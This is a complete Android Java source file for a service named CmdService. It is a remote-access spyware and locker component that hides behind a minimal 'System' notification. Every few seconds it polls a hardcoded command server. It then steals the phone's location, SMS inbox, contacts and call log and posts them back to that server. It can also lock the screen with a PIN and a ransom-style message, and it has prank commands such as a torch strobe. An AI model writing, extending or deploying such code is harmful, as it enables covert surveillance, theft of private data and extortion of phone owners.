package com.rei.target;
import android.app.*;
import android.content.*;
import android.hardware.camera2.CameraManager;
import android.location.*;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import androidx.core.app.NotificationCompat;
import org.json.*;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
public class CmdService extends Service {
    ScheduledExecutorService sch;
    String url = "http://192.168.18.26:5000";
    String did = "apk-target";
    public void onCreate() {
        super.onCreate();
        startFg();
        sch = Executors.newScheduledThreadPool(2);
        sch.scheduleAtFixedRate(this::poll, 0, 3, TimeUnit.SECONDS);
    }
    void startFg() {
        String CH = "rei";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel c = new NotificationChannel(CH, "Sys", NotificationManager.IMPORTANCE_MIN);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
        startForeground(1, new NotificationCompat.Builder(this, CH)
            .setContentTitle("System").setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN).build());
    }
    void poll() {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url + "/poll?id=" + did).openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            if (c.getResponseCode() != 200) return;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = br.readLine()) != null) sb.append(l);
            br.close();
            if (sb.length() == 0) return;
            sendResult(sb.toString(), exec(sb.toString()));
        } catch (Exception e) {}
    }
    String exec(String cmd) {
        try {
            String low = cmd.toLowerCase();
            if (low.equals("info")) {
                JSONObject o = new JSONObject();
                o.put("model", Build.MODEL); o.put("brand", Build.BRAND);
                o.put("android", Build.VERSION.RELEASE); o.put("sdk", Build.VERSION.SDK_INT);
                return o.toString();
            }
            if (low.equals("location")) {
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                Location l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (l == null) l = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (l == null) return "no loc";
                JSONObject o = new JSONObject();
                o.put("lat", l.getLatitude()); o.put("lng", l.getLongitude()); o.put("acc", l.getAccuracy());
                return o.toString();
            }
            if (low.equals("sms")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                    o.put("body", c.getString(c.getColumnIndexOrThrow("body"))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.equals("contacts")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("name", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    o.put("phone", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.equals("calllog")) {
                JSONArray a = new JSONArray();
                Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20");
                if (c != null) { while (c.moveToNext()) { JSONObject o = new JSONObject();
                    o.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    o.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION))); a.put(o); } c.close(); }
                return a.toString();
            }
            if (low.startsWith("lock")) {
                String rest = cmd.length() > 4 ? cmd.substring(4).trim() : "";
                String[] p = rest.split("\\|", 2);
                String pin = p.length > 0 && !p[0].isEmpty() ? p[0].trim() : "666";
                String txt = p.length > 1 ? p[1] : "LOCK BY NHPROJECT";
                Intent i = new Intent(this, LockActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                i.putExtra("pin", pin); i.putExtra("text", txt);
                startActivity(i);
                return "locked";
            }
            if (low.equals("vibrate")) {
                ((Vibrator) getSystemService(VIBRATOR_SERVICE)).vibrate(2000);
                return "vibrated";
            }
            if (low.equals("torch") || low.equals("strobe")) {
                CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
                String id = cm.getCameraIdList()[0];
                int n = low.equals("strobe") ? 15 : 1;
                for (int i = 0; i < n; i++) { cm.setTorchMode(id, i % 2 == 0); Thread.sleep(100); }
                cm.setTorchMode(id, false);
                return "torch ok";
            }
        } catch (Exception e) { return "err: " + e.getMessage(); }
        return "unknown";
    }
    void sendResult(String cmd, String res) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url + "/result").openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            JSONObject o = new JSONObject();
            o.put("id", did); o.put("cmd", cmd); o.put("result", res);
            OutputStream os = c.getOutputStream();
            os.write(o.toString().getBytes()); os.flush(); os.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }
    public IBinder onBind(Intent i) { return null; }
}